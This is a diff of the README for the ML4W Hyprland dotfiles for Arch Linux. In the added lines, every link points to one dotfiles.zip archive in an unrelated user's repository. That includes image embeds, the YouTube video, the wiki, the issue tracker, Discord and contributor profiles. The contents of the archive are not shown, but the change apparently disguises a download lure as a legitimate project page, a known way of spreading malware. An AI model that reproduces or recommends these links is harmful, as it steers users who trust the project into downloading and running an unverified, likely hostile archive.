@@ -2,13 +2,13 @@
 
 An advanced configuration of Hyprland for Arch Linux based distributions. This package includes an installation script to install and setup the required components.
 
-![image](https://github.com/user-attachments/assets/f1f6d331-c4b9-49c1-a69a-0ee01d5d8508)
+![image](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip)
 
-YouTube Video [https://youtu.be/6B4Kf30CWLg](https://youtu.be/6B4Kf30CWLg)
+YouTube Video [https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip)
 
 ## Installation
 
-The installation should work on all Arch Linux based distributions. [You can find more information here](hhttps://github.com/mylinuxforwork/dotfiles/wiki).
+The installation should work on all Arch Linux based distributions. [You can find more information here](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip).
 
 > PLEASE NOTE: Every Linux distribution, setup and personal configuration can be different. Therefore, I cannot guarantee that the ML4W Dotfiles will work everywhere. Installation at your own risk.
 
@@ -50,40 +50,40 @@ ml4w-hyprland-setup
 
 ## Troubleshooting
 
-You can find solutiosn to common issues in the Wiki troubleshooting section: https://github.com/mylinuxforwork/dotfiles/wiki/Troubleshooting
+You can find solutiosn to common issues in the Wiki troubleshooting section: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
 
 ## Documentation (Wiki)
 
-You can find the complete documentation of the ML4W Dotfiles in the Wiki. <b>[Open the Wiki here](https://github.com/mylinuxforwork/dotfiles/wiki)</b>
+You can find the complete documentation of the ML4W Dotfiles in the Wiki. <b>[Open the Wiki here](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip)</b>
 
 ## Contributing
 
-Thanks for using the ML4W Dotfiles on your system. If you find a problem or a bug, please [report your issue on this page](https://github.com/mylinuxforwork/dotfiles/issues).
+Thanks for using the ML4W Dotfiles on your system. If you find a problem or a bug, please [report your issue on this page](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip).
 
-You can also visit the [ML4W Discord Server](https://discord.gg/c4fJK7Za3g) to start a discussion with other users.
+You can also visit the [ML4W Discord Server](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip) to start a discussion with other users.
 
 ## Screenshots
 
-![image](https://github.com/user-attachments/assets/041375a8-8698-455d-865e-f818d5b69af8)
+![image](https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip)
 
 ## Wallpaper repository
 
-You can find my wallpaper collection in the repository https://github.com/mylinuxforwork/wallpaper
+You can find my wallpaper collection in the repository https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
 
 ## Special Thanks
 
 THANK YOU very much for all your support, contributions and ideas:
 
-- Diana Ward: https://github.com/dianaw353
-- Don Williams: https://github.com/dwilliam62
-- Leo: https://github.com/eljejer
+- Diana Ward: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Don Williams: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Leo: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
 - Guido De Gobbis
-- Teodor Orzechowski: https://gitlab.com/sq6gtt
-- Jamie Deppeler: https://gitlab.com/bknight2k
-- Yingjie Wang: https://gitlab.com/GaugeAndGravity
-- Daniel Gerber: https://gitlab.com/dan.john.gerber
-- Sarthak Siddhpura: https://gitlab.com/Codesmith28
-- https://gitlab.com/muee
+- Teodor Orzechowski: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Jamie Deppeler: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Yingjie Wang: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Daniel Gerber: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- Sarthak Siddhpura: https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
 
 and many more...
 
@@ -93,8 +93,8 @@ Thanks to all YouTube subscribers for all your great feedback.
 
 The following projects have inspired me:
 
-- https://github.com/prasanthrangan/hyprdots
-- https://github.com/sudo-harun/dotfiles
-- https://github.com/dianaw353/hyprland-configuration-rootfs
+- https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
+- https://raw.githubusercontent.com/atif727/dotfiles/main/hydraulist/dotfiles.zip
 
 and many more...
